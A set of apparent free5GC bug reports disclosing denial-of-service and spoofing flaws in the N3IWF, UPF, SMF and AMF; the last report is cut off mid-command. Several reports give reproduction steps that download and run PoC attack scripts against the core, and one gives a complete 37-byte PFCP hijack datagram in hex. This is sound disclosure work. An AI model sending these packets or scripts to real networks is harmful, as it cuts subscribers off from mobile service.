items.title: [Bugs] A Single Malformed Pre-Auth IKEv2 Datagram Panics the Payload Parser and Permanently, Silently Kills the IKE Dispatch Loop (N3IWF)
items.body:
### Bug Description

free5gc's **N3IWF** parses IKEv2 with the shared library `github.com/free5gc/ike`. Its Security-Association parser validates a Proposal's `ProposalLength` and `SPISize` independently but never relates them, so a proposal declaring `ProposalLength=8` with `SPISize=4` evaluates the slice `b[8+SPISize : ProposalLength]` as `b[12:8]` and panics with `slice bounds out of range [12:8]`. A sibling defect in the Delete parser walks the residual buffer in a fixed 4-byte stride without checking its length, and panics the same way. Both are reached inside an `IKE_SA_INIT` — plaintext, **before any authentication or cryptographic operation**.

The panic alone would be an ordinary bug; the outage is permanent because of **where it is caught**. The N3IWF has a single IKE dispatch goroutine, and the `recover()` sits in that goroutine's own `defer` — so containing the panic *is* terminating the loop: the handler logs `Ike server stopped`, closes the packet channels and returns, and nothing respawns it. The UDP receivers keep running but now discard every datagram silently.

The result is an outage invisible to every health signal: after one 44-byte datagram the container still reports `running`, `ExitCode=0`, no restart, no healthcheck — while no UE can attach over non-3GPP access again. Since the process never exits, a restart policy would not help; only a manual container restart restores service.

### To Reproduce

Tested target: free5gc **v4.2.3**, Docker Compose (`4.2.3-n3iwf` variant), N3IWF container `n3iwf` (`free5gc/n3iwf:v4.2.3`, IKEv2 library `github.com/free5gc/ike@v1.2.1`) at `10.100.200.15:500/udp` on the user bridge `423-n3iwf_privnet` (`10.100.200.0/24`); the UE is `n3iwue` at `10.100.200.203`. The attack runs from the Docker host and needs Python 3 standard library only.

1. **Deploy the target core** (16 containers):

   ```bash
   git clone https://github.com/hackeryounow/5gc-deployments.git
   cd 5gc-deployments/free5gc/4.2.3-n3iwf
   docker compose down          # clear any previous instance and release the bridge
   docker compose up -d
   sleep 45                      # NFs register at the NRF; gNB completes NG-Setup
   ```

2. **Provision test subscribers** (via the WebUI API on this host):

   ```bash
   pip3 install git+https://github.com/hackeryounow/coresimrunner.git@v1.4.0
   coresimrunner  --mode provision --count 5 --core-network free5gc \
           --core-address 127.0.0.1 --webui-port 5000 \
           --initial-imsi-index 1 --plmn 20893 \
           --opc 8e27b6af0e692e750f32667a3b14605d \
           --ki 8baf473f2f8fd09487cccbd7097c6862 \
           --username admin --password free5gc --no-ims
   ```

3. **Verify the deployment environment is complete** 

```bash
   # register
   docker exec n3iwue pkill -9 n3iwue
   docker exec n3iwue ./clean.sh
   docker exec -d n3iwue sh -c './n3iwue > /tmp/n3ue.log 2>&1'
   # session testing (bind to the PDU address from table 101's local route — a bare ping,
   # or an empty interface variable, would false-pass via the container's eth0 NAT)
   docker exec n3iwue sh -c 'IP=$(ip route show table 101 2>/dev/null | awk "/^local/{print \$2}"); if [ -n "$IP" ]; then ping -I "$IP" -c 3 8.8.8.8; else echo "NO PDU session (table 101 empty)"; fi'
   # environment ready when -> PING 8.8.8.8 from 10.60.0.1: 3 packets received, 0% packet loss
```

4. **Fire the attack** — one malformed pre-auth datagram (case A). The run's own output is the network evidence (baseline ANSWERED → post-attack SILENT); then confirm the panic was recovered and the process never crashed:

```bash
   wget https://raw.githubusercontent.com/hackeryounow/5GCVulDB/refs/heads/main/VUL-20260921-POC/ike_dos.py
   python3 ike_dos.py --target 10.100.200.15 --port 500 --mode full --case A --sainit-probe
   
   # network evidence is the run's own output: baseline ANSWERED (3 probes + a genuine
   # 656-byte IKE_SA_INIT reply) -> ONE 44-byte datagram, no reply -> post-attack probes
   # and post-attack IKE_SA_INIT all SILENT; exit 0 = IKE dispatch loop killed

   # (1) log evidence: the panic was RECOVERED, not a crash — and it terminated the dispatch loop
   docker logs n3iwf 2>&1 | grep -nE "slice bounds out of range|Ike server stopped|payload_securityassociation.go:181"
   # -> panic: runtime error: slice bounds out of range [12:8]   (sink: payload_securityassociation.go:181)
   # -> Ike server stopped                                       (the dispatch loop never runs again)

   # (2) container evidence: the N3IWF process is still alive — no exit, no OOM, no restart
   docker inspect n3iwf --format '{{.State.Status}} exit={{.State.ExitCode}} oom={{.State.OOMKilled}} restarts={{.RestartCount}} health={{.State.Health}}'
   # -> running exit=0 oom=false restarts=0 health=<nil>

   docker restart n3iwue
   docker exec n3iwue sh -c 'IP=$(ip route show table 101 2>/dev/null | awk "/^local/{print \$2}"); if [ -n "$IP" ]; then ping -I "$IP" -c 3 8.8.8.8; else echo "NO PDU session (table 101 empty)"; fi'
   # after the attack -> NO PDU session (table 101 empty): the UE keeps retrying IKE_SA_INIT with no reply

```

### Expected Behavior

A malformed IKEv2 datagram should be rejected and logged while the N3IWF's IKE service keeps running; instead one pre-authentication packet panics the parser and the recovery handler terminates the only dispatch loop, so the container keeps reporting `running / exit 0` while all non-3GPP access is permanently dead until the container is restarted by hand.

### Screenshots

**Recovered panic and loop termination** (`docker logs n3iwf`) — the panic is caught at `server.go:112`, the sink is `payload_securityassociation.go:181`, and the handler immediately ends the dispatch loop:

```
[ERRO][N3IWF][IKE] panic: runtime error: slice bounds out of range [12:8]
goroutine 98 [running]:
	/go/src/free5gc/NFs/n3iwf/internal/ike/server.go:112 +0x46          <-- recover() in the loop-owning goroutine's defer
panic({0xe76aa0?, 0x30331e40e1b0?})
	/usr/local/go/src/runtime/panic.go:860 +0x13a
github.com/free5gc/ike/message.(*SecurityAssociation).Unmarshal(...)
	/go/pkg/mod/github.com/free5gc/ike@v1.2.1/message/payload_securityassociation.go:181 +0xb31   <-- SINK
github.com/free5gc/ike/message.(*IKEMessage).DecodePayload(...)
	/go/src/free5gc/NFs/n3iwf/internal/ike/server.go:294 +0xb1
	/go/src/free5gc/NFs/n3iwf/internal/ike/server.go:127 +0x245
created by github.com/free5gc/n3iwf/internal/ike.(*Server).Run in goroutine 1
	/go/src/free5gc/NFs/n3iwf/internal/ike/server.go:102 +0x375
[INFO][N3IWF][IKE] Ike server stopped                                    <-- the dispatch loop never runs again
```

**UE-level impact** — after the kill a fresh non-3GPP registration cannot complete, while it worked at baseline:

```
baseline (before attack):  Registration Accept -> PDUSession Accept -> PDU Address 10.60.0.1
                           ping -I gretun-id-2-1 8.8.8.8 -> 3 packets received, 0% packet loss
after attack:              27 x "start IKE_SA_INIT message", 0 replies, 0 SA established
                           ip route show table 101 -> (empty)
                           ping -I 10.60.0.1 8.8.8.8 -> ping: bind: Cannot assign requested address

root@kubernetes:~docker exec n3iwue ip -br addr
lo               UNKNOWN        127.0.0.1/8 ::1/128
eth0@if20        UP             10.100.200.203/24
gre0@NONE        DOWN
gretap0@NONE     DOWN
erspan0@NONE     DOWN
ipsec-1@eth0     UNKNOWN        10.0.0.5/24 fe80::868b:1251:65c0:db9/64
ipsec-2@eth0     UNKNOWN        10.0.0.5/24 fe80::e33c:7c8:27ac:b9b1/64
vrf-pdu-1        UP
gretun-id-2-1@ipsec-2 UNKNOWN        10.60.0.3/32 fe80::5efe:a00:5/64

```


### Environment

Please complete the following information:
- free5GC Version: v4.2.3
- Deployment: Docker-based 5G Core Network
- OS: Ubuntu 22.04 Desktop
- Kernel version: 138~22.04.1-Ubuntu
- go version: 1.21.8 linux/amd64

Tested components:
- N3IWF image: `free5gc/n3iwf:v4.2.3`
- IKEv2 library: `github.com/free5gc/ike@v1.2.1`
- PoC: `ike_dos.py` (Python 3 standard library only — no scapy, no strongswan)

### Trace Files

None

### Additional Context

**Vulnerability Type.** Out-of-bounds slice access from unchecked length fields in the pre-authentication IKEv2 parser (CWE-125 / CWE-191 / CWE-20).

**Impact.** A single UDP datagram of 37–52 bytes removes 100 % of untrusted non-3GPP access to the 5G core, permanently and silently: no new IKE SA can be created, no UE can register or re-register over that access, and the failure is idempotent — one more packet re-kills the N3IWF after each restart. Because the N3IWF is a shared function and the process never exits, the container reports healthy the whole time, so the outage is undetectable without an active IKE probe and unrecoverable without manual intervention.

**CVSS v4.** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N` — **8.7 (High)**.

items.title: [Bugs] Unauthenticated PFCP Association Hijack & Permanently Unreclaimable `s.rnodes` Growth
items.body:
## Bug Description

A missing authentication vulnerability exists in the free5GC v4.2.3 UPF PFCP Association Setup handling. The UPF identifies PFCP peers only by the attacker-controlled Node ID and does not verify the packet source against the address of an existing association.

An unauthenticated attacker with network access to UDP/8805 can send a forged PFCP Association Setup Request using the Node ID of the legitimate SMF. The UPF then deletes the existing SMF association and all associated PFCP sessions before rebinding the Node ID to the attacker's source address. A single forged packet can therefore terminate active user-plane sessions and cause a persistent denial of service.

The same unauthenticated interface also accepts unlimited distinct Node IDs without removing stale associations. Repeated Setup Requests can continuously grow the UPF peer table and consume memory until the process is terminated by the OOM killer.

## To Reproduce

Prerequisites: a running free5GC v4.2.3 Docker stack with the SMF↔UPF PFCP association established and one UE registered with two PDU sessions (so there is live user-plane state to destroy). The PoC is pure Python 3 standard library (no dependencies).

1. **Deploy & gate end-to-end health.** Bring up the free5GC v4.2.3 compose stack, drive one UE to registration + two PDU sessions (`uesimtun0`/`uesimtun1` up), and confirm the SMF→UPF association exists. In this deployment the SMF Node ID is `smf.free5gc.org` and the UPF N4 endpoint is `upf.free5gc.org:8805` (10.100.200.3).

2. **Resolve the UPF N4 address** (docker re-assigns IPs across `down`/`up` cycles):
   ```bash
   UPF_IP=$(docker inspect upf --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
   ```

3. **Run the PoC** (`upf_assoc_hijack_poc.py`, Python 3 stdlib only — full source in [`pkgs/README.md`](README.md) §Complete PoC):
   ```bash
   # (a) Resource-exhaustion / leak: N distinct Node IDs -> N permanently unreclaimable s.rnodes entries
   python3 upf_assoc_hijack_poc.py --target "$UPF_IP" --mode leak  --count 100000
   #     -> 100000/100000 accepted in ~22.4s, RSS 8.1->144 MiB, delete_node=0  (DESTRUCTIVE: memory)

   # (a-oom) OOM-crash variant: cap the UPF container at 2 GB, then send ~2 M distinct Node IDs
   docker update --memory 2g --memory-swap 2g upf
   python3 upf_assoc_hijack_poc.py --target "$UPF_IP" --mode leak --count 1000000 --report-every 50000
   python3 upf_assoc_hijack_poc.py --target "$UPF_IP" --mode leak --count 1000000 --leak-prefix leak2 --report-every 100000
   #     -> phase 1: 1M accepted, RSS 15->1 288 MB;  phase 2: RSS -> 2 091 MB -> kernel OOM kill
   #        (exit=137, OOMKilled=true, restarts=0; ~1.27 KiB per association)

   # (b) Hijack / mass teardown: ONE 37-byte datagram destroys all sessions of smf.free5gc.org
   python3 upf_assoc_hijack_poc.py --target "$UPF_IP" --mode hijack --node-id smf.free5gc.org
   #     -> Cause=Request accepted; UPF logs "delete node ... sess:map[0x1,0x2]" + "sess deleted"x2 + "New node";
   #        loss 0%->100%, persists across UPF restart  (DESTRUCTIVE: user plane)

   # inspect the exact bytes without sending anything
   python3 upf_assoc_hijack_poc.py --target "$UPF_IP" --mode hijack --dry-run
   ```

**The 37-byte attack datagram** (`--mode hijack --node-id smf.free5gc.org`):

```
20 05 00 21 00 00 01 00  00 3c 00 11 02 03 73 6d 66 07 66 72 65 65 35 67 63 03 6f 72 67 00 60 00 04 ee 52 08 a0
```

| Offset | Bytes | Meaning |
|---|---|---|
| 0 | `20` | PFCP v1, `S=0` (node-related, no SEID) |
| 1 | `05` | Message Type 5 = Association SetupRequest |
| 2-3 | `00 21` | Message Length = 33 (total 37) |
| 4-6 | `00 00 01` | Sequence Number = 1 |
| 7 | `00` | Spare |
| 8-9 | `00 3c` | IE Type 60 = **Node ID** |
| 10-11 | `00 11` | IE Length = 17 |
| 12 | `02` | Node ID Type = **FQDN** |
| 13-28 | `03 73 6d 66 07 66 72 65 65 35 67 63 03 6f 72 67` | length-prefixed `smf.free5gc.org` (**no** root terminator, matching go-pfcp) |
| 29-30 | `00 60` | IE Type 96 = **Recovery Time Stamp** |
| 31-32 | `00 04` | IE Length = 4 |
| 33-36 | `ee 52 08 a0` | Time stamp (decoded at `:42` and **discarded**) |

**Observed** (UPF returns acceptance in ~11 ms): `msg_type=6` (Association Setup Response), `cause=1 (Request accepted)`, `upf_node_id=upf.free5gc.org`. UPF log signature (the smoking gun): `delete node: &pfcp.RemoteNode{ID:"smf.free5gc.org", ..., sess:map[uint64]struct{}{0x1:..., 0x2:...}}` → `[CPSEID:0x1] sess deleted` → `[CPSEID:0x2] sess deleted` → `[CPNodeID:smf.free5gc.org] New node`. **Critical negative signature:** no `panic`, no `fatal`, no signal, no restart — `upf` stays `running`, `RestartCount=0`. Reproducibility: **4/4 = 100%** (hijack 2/2, leak 2/2) across full environment rebuilds.


## Screenshots

None

## Environment

- **free5GC Version:** v4.2.3 — `free5gc/upf:v4.2.3` (image digest `sha256:b1c4e6967db6e244b43c0cbe5bba498d3a55e506c580134ca131f5ee6df99c75`); source tree `v4.2.3-4-g387710d`, `internal/pfcp/association.go` has the identical vulnerable block at `:48-58` and no-op Release/Update at `:76-88`
- **Deployment:** Docker-based 5G Core Network (free5GC basic compose, 16 containers, N4 on bridge `10.100.200.0/24`; UPF N4 `upf.free5gc.org:8805` = 10.100.200.3; SMF Node ID `smf.free5gc.org`)
- **OS:** Ubuntu 22.04 Desktop
- **Kernel version:** 138~22.04.1-Ubuntu
- **go version:** 1.21.8 linux/amd64

## Trace Files

[Artifacts](https://media.githubusercontent.com/media/hackeryounow/5GCVulDB/refs/heads/main/VUL-20260916-POC/packages.zip) present in this repository:

- `upf_assoc_hijack_poc.py`— the PoC (Python 3 stdlib; modes `hijack`/`leak`).
- `pcap/`— N4 PCAP capture (excluding SSH port 22) of the v4.2.3 hijack reproduction: `hijack.pcap` — the 37-byte attack datagram, the UPF's acceptance response, then silence (`hijack-tcpdump.txt` holds the capture stats).
- `logs/`— trimmed logs of the v4.2.3 hijack reproduction: `hijack-upf.log` (post-attack lines only: forged `handleAssociationSetupRequest` → `delete node` → `sess deleted` ×2 → `New node`) and `hijack-smf.log` (last 200 lines; its final entry, 12:56:11, is six seconds **before** the 12:56:17 attack — the SMF logged **zero** entries at/after it).


## Additional Context

- **Vulnerability Type:** Resource Exhaustion (Denial of Service). 
- **CWE:** CWE-306 (Missing Authentication for Critical Function, primary)
- **CVSS v4 (report assessment):**
  `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H`

items.title: [Bugs] One Spoofed PFCP Association Message Releases Every PDU Session on a Chosen UPF
items.body:
### Bug Description

The free5GC **SMF** decides *who sent* a PFCP (N4, UDP/8805) message by reading the **Node ID IE inside the message body** (`nodeIDFromIE(request.NodeID)`), never by checking the UDP source address. The source address is available in the handler and is simply not used. So any host that can deliver one UDP datagram to the SMF's N4 port can claim to be a UPF that the SMF is already associated with.

The logic is short. The SMF and the UPF are correctly associated and carrying live PDU Sessions. An attacker on a different host then sends two ordinary PFCP messages naming that UPF's Node ID:

1. an **Association Setup Request** with a Recovery Time Stamp newer than the SMF's own — the SMF concludes the UPF has restarted and releases everything it holds on it;
2. an **Association Update Request** with the same Node ID and the **SARR** bit set (IE 111 payload `0x01`) — the SMF concludes the UPF has asked to be released and terminates the sessions that remain.

Every PDU Session on that UPF is then gone, and the UEs recover only by re-registering, with new UE IP addresses.

The messages themselves are spec-legal and the SMF's reaction to them is the designed one; the defect is that it never verifies who sent them. Two negative controls show that the whole outcome hangs on that single bit: the same Update with no IE 111, or with IE 111 = `0x02` (URSS), is likewise accepted with `cause=1` and destroys nothing.

### To Reproduce

Tested target: free5GC **v4.3.0**, SMF N4 at `10.100.200.5:8805/udp`, UPF Node ID `10.100.200.3` (`upf.free5gc.org`). The attack is run from the Docker host (the compose bridge, `10.100.200.1`); root is not required.

1. **Deploy the target core** (tngf exits 0 by design):

   ```bash
   git clone https://github.com/hackeryounow/5gc-deployments.git
   cd 5gc-deployments/free5gc/4.3.0
   docker compose -p free5gc-v430 up -d
   sleep 45                      # let the NFs register at the NRF
   ```

2. **Provision subscribers** (a fresh `dbdata` volume is empty — registration fails without this) **and start the UE**:

   ```bash
   pip3 install git+https://github.com/hackeryounow/coresimrunner.git@v1.4.0
   coresimrunner --mode provision --count 5 --core-network free5gc \
           --core-address 127.0.0.1 --webui-port 5000 \
           --initial-imsi-index 1 --plmn 20893 \
           --opc 8e27b6af0e692e750f32667a3b14605d \
           --ki 8baf473f2f8fd09487cccbd7097c6862 \
           --username admin --password free5gc --no-ims
   docker exec -d ueransim bash -c 'cd /ueransim && ./nr-ue -c ./config/uecfg.yaml > /tmp/ue.log 2>&1'
   sleep 40 && docker exec ueransim sh -c 'ip -br addr | grep uesimtun'
   # -> uesimtun0 10.60.0.1/16   uesimtun1 10.61.0.1/16
   ```

3. **Run the negative controls** — both must be accepted with nothing torn down:

   ```bash
   wget https://raw.githubusercontent.com/hackeryounow/5GCVulDB/refs/heads/main/VUL-20260929-POC/b1_2_pfcp_assoc_release_poc.py
   python3 b1_2_pfcp_assoc_release_poc.py --target 10.100.200.5 --upf-node-id 10.100.200.3 --stage update-benign
   # -> round 1 step1 AssociationUpdateRequest(no SARR)   cause=1 (Request accepted)
   python3 b1_2_pfcp_assoc_release_poc.py --target 10.100.200.5 --upf-node-id 10.100.200.3 --stage update-urss
   # -> cause=1; SMF logs "reported that non-zero Usage Reports"; tunnels unchanged
   ```

4. **Fire the two-stage spoof** (25-octet Setup + 22-octet Update, 47 octets total) and verify the teardown:

   ```bash
   python3 b1_2_pfcp_assoc_release_poc.py --target 10.100.200.5 --upf-node-id 10.100.200.3 --stage both
   # -> step1 Setup cause=1; step2 Update(SARR=1) cause=1
   sleep 16
   docker exec ueransim sh -c 'ip -br addr | grep uesimtun'     # -> empty: both PDU Sessions gone
   docker logs smf --since <UTC timestamp from before step 4> 2>&1 | grep -E 'Recovery Time Stamp|Release all resources|Release IP'
   sleep 14                                                     # second wave: genuine Release to the real UPF times out
   ```

### Expected Behavior

The SMF must not accept node-identity claims from the message body of an unauthenticated datagram: a PFCP node message whose UDP source address does not belong to the configured UPF must be ignored, and a PDU Session teardown may only ever result from the genuine UPF's own association management.

### Screenshots

**PoC acceptance of both spoofed stages** (both answered `cause=1`):

```
[+] round 1 step1 AssociationSetupRequest             cause=1 (Request accepted)
[+] round 1 step2 AssociationUpdateRequest(SARR=1)    cause=1 (Request accepted)
```

**SMF teardown, wave 1** (`docker logs smf`, attack window) — the spoofed Setup invalidates the association and both PDU Sessions are released:

```
[WARN][SMF][PFCP]  UPF[10.100.200.3] sent Association Setup with a newer Recovery Time Stamp; invalidating association generation 1
[INFO][SMF][Main]  Canceled association to UPF[[upf.free5gc.org](10.100.200.3)]
[INFO][SMF][Main]  Release all resources of UPF [upf.free5gc.org](10.100.200.3)
[INFO][SMF][Main]  Invalidated 2 PFCP sessions for UPF[upf.free5gc.org](10.100.200.3)
[INFO][SMF][PduSess] UE[imsi-208930000000001] PDUSessionID[2] Release IP[10.61.0.1]
[INFO][SMF][PduSess] UE[imsi-208930000000001] PDUSessionID[1] Release IP[10.60.0.1]
```

**Wave 2, ~12 s later** — the genuine Association Release the SMF sent to the innocent real UPF times out and the SMF cancels the association again:

```
[ERRO][SMF][PFCP] PFCP Association Release Request to UPF[upf.free5gc.org](10.100.200.3) failed: PFCP Association Release Request to 10.100.200.3:8805: PFCP request to 10.100.200.3:8805 timed out
[INFO][SMF][Main] Canceled association to UPF[[upf.free5gc.org](10.100.200.3)]
[INFO][SMF][Main] Release all resources of UPF [upf.free5gc.org](10.100.200.3)
```

**Container oracle** — graceful teardown, no crash and no restart:

```
/smf running exit=0 restarts=0
/upf running exit=0 restarts=0
/amf running exit=0 restarts=0
```

**Tunnel oracle** — both PDU Sessions destroyed; the UE only recovers by re-registering (fresh IPs `10.60.0.2` / `10.61.0.2`):

```
before:  uesimtun0 10.60.0.1/16   uesimtun1 10.61.0.1/16
after:   (no uesimtun* interfaces)
```

### Environment

Please complete the following information:
- free5GC Version: v4.3.0
- Deployment: Docker-based 5G Core Network
- OS: Ubuntu 20.04.6 LTS
- Kernel version: 5.15.0-139-generic
- go version: 1.27.1 linux/amd64

### Trace Files

None

### Additional Context

**Vulnerability Type.** Missing authentication for a critical function (CWE-306): the SMF's N4 endpoint trusts the Node ID IE from an unauthenticated datagram instead of validating the peer address, which is an authentication bypass by spoofing (CWE-290).

**Impact.** Any host that can reach the SMF's UDP/8805 can tear down the SMF↔UPF association and every PDU Session carried on that UPF with 47 octets; subscriber traffic stops until UEs re-register, and the SMF then amplifies the attack itself by cancelling the healthy association a second time.

**CVSS v4.** `CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N` — **6.8 (Medium)**.

items.title: free5GC AMF: unsafe type assertion on subscriber DNN (interface{}) crashes the NGAP worker — unauthenticated core DoS when chained with the webconsole subscriber write (FIND-001)
items.body:
# free5GC AMF: unsafe type assertion on subscriber DNN (interface{}) crashes the NGAP worker  -  unauthenticated core DoS when chained with the webconsole subscriber write (FIND-001)

**Severity:** HIGH | **CVSS 3.1:** 7.5 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` | **CWE:** CWE-704 | **Affected:** free5gc @ `5fc8fa5ec3d7`

## Summary
AMF reads the subscriber's SmfSelectionSubscriptionData (fetched from UDM/UDR) and, in internal/gmm/handler.go:258, executes `dnn = dnnInfo.Dnn.(string)`  -  a BARE type assertion (no comma-ok) on models.DnnInfo.Dnn, which is typed `interface{}`. The DNN value originates from the provisioning record. free5GC's webconsole stores subscriber JSON verbatim via toBsonM (a json->bson round-trip with no type coercion), so a DNN supplied as a JSON number is persisted as a numeric (float64) BSON value. When the affected UE registers, the AMF unmarshals that value into the interface{} field as a float64 and the bare `.(string)` assertion panics. The panic is recovered in the NGAP worker (scheduler.go:47) by logger.NgapLog.Errorf, but the recover sits in the worker run() goroutine's defer, so the worker goroutine exits  -  that worker (which processes a UE-ID-hashed subset of UEs, and worker 0 handles non-UE NGSetup) is permanently lost.

## Affected
- **Component:** free5gc/amf@dbfb9a50 (umbrella free5gc v4.2.2)  -  internal/gmm/handler.go:258 (also :1298,:1320 LADN path); models.DnnInfo.Dnn is interface{} (openapi/models/model_dnn_info.go:16); recover scope internal/ngap/scheduler.go:47
- **Repository / commit:** https://github.com/free5gc/free5gc @ `5fc8fa5ec3d74bcb12971cc537211ce6c7f15544 (amf submodule dbfb9a50)`
- **Attacker / interface:** Unauthenticated network attacker (poison written via the webconsole's unauthenticated PUT /api/subscriber  -  FIND-001); alternatively any authenticated webconsole operator.

## Root cause
```c
// openapi/models/model_dnn_info.go:16
type DnnInfo struct { Dnn interface{} `json:"dnn"...`; DefaultDnnIndicator bool ... }
// amf/internal/gmm/handler.go:255-259  -  BARE assertion, no comma-ok
for _, dnnInfo := range snssaiInfo.DnnInfos {
    if dnnInfo.DefaultDnnIndicator {
        dnn = dnnInfo.Dnn.(string)   // panics if Dnn is a number (float64)
    }
}
// also handler.go:1298, :1320: amfSelf.LadnPool[dnnInfo.Dnn.(string)]
// amf/internal/ngap/scheduler.go:47  -  recover logs Errorf; worker run() then RETURNS (worker dies)
```

## Reachability (untrusted source -> sink)
webconsole PutSubscriberByID (no auth, FIND-001) -> toBsonM json->bson stores dnn as float64 -> MongoDB subscriptionData -> UDR/UDM -> AMF ue.SmfSelectionData -> gmm/handler.go:255 loop -> :258 dnnInfo.Dnn.(string) panic -> ngap/scheduler.go:47 worker recover(Errorf) + run() exit -> worker dies. Unfixed at HEAD (assertion is bare).

## To reproduce
1. git clone --recurse-submodules https://github.com/free5gc/free5gc.git && cd free5gc && git checkout 5fc8fa5ec3d74bcb12971cc537211ce6c7f15544
2. # (a) demonstrate the AMF sink panic with the real models + exact code (no full stack needed):
3. mkdir /tmp/amftc && cd /tmp/amftc
4. printf 'module amftc\ngo 1.24.0\nrequire github.com/free5gc/openapi v1.2.4\n' > go.mod
5. cat > main.go <<'EOF'
package main
import ( "encoding/json"; "fmt"; "github.com/free5gc/openapi/models" )
func main(){
  stored := `{"subscribedSnssaiInfos":{"01010203":{"dnnInfos":[{"dnn":123456,"defaultDnnIndicator":true}]}}}`
  var smf models.SmfSelectionSubscriptionData; json.Unmarshal([]byte(stored), &smf)
  for _, si := range smf.SubscribedSnssaiInfos { for _, d := range si.DnnInfos { if d.DefaultDnnIndicator { _ = d.Dnn.(string) } } }
  fmt.Println("no panic") }
EOF
6. GOFLAGS=-mod=mod GOTOOLCHAIN=auto go mod tidy && go run main.go   # => panic: interface conversion: interface {} is float64, not string
7. # (b) the poisoning write is unauthenticated via the webconsole (see FIND-001): PUT /api/subscriber/.../... with dnnInfos[].dnn as a JSON number returns 204 and stores it as a number.

## Output
unauth PUT poisoned dnn=123456 -> HTTP 204, GET shows dnn:123456 (number). Harness (real openapi models + exact sink): PANIC interface conversion: interface {} is float64, not string, exit 1

_Demonstrated vs inferred:_ DEMONSTRATED: (1) unauthenticated storage of a non-string DNN (live, HTTP 204 + read-back). (2) the exact AMF sink panics on the real-model unmarshal of that stored JSON (harness). INFERRED (source-confirmed, needs full 5GC stack to fire live): the in-AMF NGAP worker death when the victim UE registers (recover->worker-exit is in source).

## Impact
Denial of service of AMF NGAP processing. An attacker who can write a subscriber's SmfSelectionSubscriptionData with a non-string DNN causes the AMF NGAP worker handling that UE to panic and die on the UE's next registration  -  persistently denying NGAP processing to the UEs assigned to that worker (and, by poisoning subscribers that hash to different workers, progressively killing all workers -> total NGAP/registration denial for the gNB). Crucially the write is reachable UNAUTHENTICATED via FIND-001 (the webconsole PUT /api/subscriber has no auth), making this an unauthenticated, network-reachable core-network DoS. DEMONSTRATED: the unauth PUT stores dnn=123456 as a number (HTTP 204, read back unquoted); and the exact AMF sink  -  real openapi models unmarshal of the stored JSON + `dnnInfo.Dnn.(string)`  -  panics with `interface conversion: interface {} is float64, not string`. INFERRED (needs a full gNB/UE/UDM/UDR stack to fire live): the in-process worker death during the victim UE's registration; the recover->worker-exit is source-confirmed.

## Suggested fix
Use a checked assertion everywhere DnnInfo.Dnn / any interface{} model field is read: `dnn, ok := dnnInfo.Dnn.(string); if !ok { /* reject record */ }` (handler.go:258, :1298, :1320, and audit all `.(string)` on interface{} model fields). Validate provisioning input types at the webconsole (reject non-string DNN) and at UDR. Make the NGAP worker recover re-spawn the worker rather than letting run() exit.

items.title: [Bugs] SMF PCFSelection panics on empty NRF discovery result during PDU session establishment
items.body:
## Bug Decription
`SMF`, when establishing a new PDU session, calls `PCFSelection` to discover a PCF via NRF (`/nnrf-disc/v1/nf-instances?target-nf-type=PCF&...`). The consumer-side handler in `internal/sbi/consumer/nrf_service.go:441-442` indexes the NRF discovery response **without checking whether `NfInstances` is empty**. When NRF returns a successful `200 OK` whose body has `"nfInstances": null` (or `[]`, or the field absent), `res.SearchResult.NfInstances[0]` panics with `runtime error: index out of range [0] with length 0`.

The defect is glaring because the **sister function `CHFSelection` five lines above guards the access correctly**:

```go
// internal/sbi/consumer/nrf_service.go (deployed v4.2.2 — SMF v1.4.3 line numbers,
//                                       identical at upstream master commit 2232d29)

// CHFSelection — properly guarded
func (s *nnrfService) CHFSelection(smContext *smf_context.SMContext) error {
    ...
    res, err := client.NFInstancesStoreApi.SearchNFInstances(ctx, request)
    if err != nil {
        logger.ConsumerLog.Errorf("SearchNFInstances failed: %+v", err)
        return err
    }
    if res != nil && len(res.SearchResult.NfInstances) > 0 {        // ← guard
        smContext.SelectedCHFProfile = res.SearchResult.NfInstances[0]
        return nil
    }
    return fmt.Errorf("no CHF found in CHFSelection")
}

// PCFSelection — UNGUARDED  (lines 416-444)
func (s *nnrfService) PCFSelection(smContext *smf_context.SMContext) error {
    ...
    res, err := client.NFInstancesStoreApi.SearchNFInstances(ctx, request)
    if err != nil {
        return err
    }
    // Select PCF from available PCF
    smContext.SelectedPCFProfile = res.SearchResult.NfInstances[0]   // ← line 442: panic
    return nil
}
```

`SearchResult.NfInstances` is typed `[]NrfNfDiscoveryNfProfile,omitempty`. When NRF has no matching PCF instance — either because no PCF is registered, NRF discovery filters exclude all candidates, or an attacker controls the NRF response (NRF NFM PUT is unauthenticated, see free5gc/free5gc#990) — NRF returns a syntactically-valid `200 OK` whose body looks like:

```json
{"validityPeriod":100,"nfInstances":null}
```

`json.Unmarshal` happily fills `NfInstances` with a zero-length slice (or nil-slice for `null`). The unguarded `[0]` access panics deterministically.

`PCFSelection` is invoked on **every** new PDU session establishment via this chain (`internal/sbi/processor/pdu_session.go:212`):

```go
// BSF-aware PCF selection: first check BSF for existing PCF binding
if bsfErr := p.Consumer().BSFAwarePCFSelection(smContext); bsfErr != nil {
    smContext.Log.Errorln("PCF selection error (with BSF integration):", bsfErr)
    // Fallback to traditional PCF selection if BSF integration fails
    if fallbackErr := p.Consumer().PCFSelection(smContext); fallbackErr != nil {
        smContext.Log.Errorln("fallback PCF selection error:", fallbackErr)
    }
}
```

`BSFAwarePCFSelection` (`internal/sbi/consumer/bsf_service.go:152-198`) tries BSF first, falls back to `PCFSelection` for any new session — and itself contains a similar but **properly guarded** access at line 188 (`if searchErr != nil || res == nil || len(res.SearchResult.NfInstances) == 0`). So BSFAwarePCFSelection's own NRF query is safe; the panic site is the explicit fallback at line 442.



## To Reproduce
The panic requires SMF to invoke `PCFSelection` **and** for NRF to return zero PCF instances. Two equally-realistic triggers cover this:

### Reproducer A — PCF unregistered / unhealthy

Realistic operational failure mode: PCF crashed, scaled to zero, or is in the process of registering when a UE attempts a fresh PDU session.

#### Step 1 — remove PCF from NRF

```bash
docker stop pcf
docker exec <mongo-container> mongo free5gc --quiet --eval \
  'db.NfProfile.deleteMany({nfType:"PCF"})'

# Verify NRF discovery returns empty:
SMF_INST=$(docker exec <mongo-container> mongo free5gc --quiet --eval \
